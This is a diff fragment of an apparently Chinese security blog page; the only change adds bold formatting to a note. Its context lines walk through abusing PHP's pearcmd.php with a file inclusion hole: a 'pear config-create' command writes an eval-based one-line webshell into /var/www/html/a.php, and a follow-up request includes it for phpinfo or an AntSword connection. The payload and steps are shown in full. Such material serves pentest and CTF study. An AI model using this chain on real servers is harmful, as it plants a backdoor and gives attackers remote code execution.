@@ -98,7 +98,7 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create /&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);phpinfo()?&gt; /var/www/html/a.php</span><br></pre></td></tr></table></figure>
 
 <p>这条命令会把含有一句话木马的字符串写入到 &#x2F;var&#x2F;www&#x2F;html&#x2F;a.php 文件中</p>
-<p>注意：请求里的尖括号会被 url 编码，需要使用 burpsuit 抓包，修改回原来的符号</p>
+<p><strong>注意</strong>：请求里的尖括号会被 url 编码，需要使用 <strong>burpsuit</strong> 抓包，修改回原来的符号</p>
 <p>此时再去包含生成的 &#x2F;var&#x2F;www&#x2F;html&#x2F;a.php 文件，即可执行 phpinfo ；或利用蚁剑连接</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=a.php</span><br></pre></td></tr></table></figure>
 
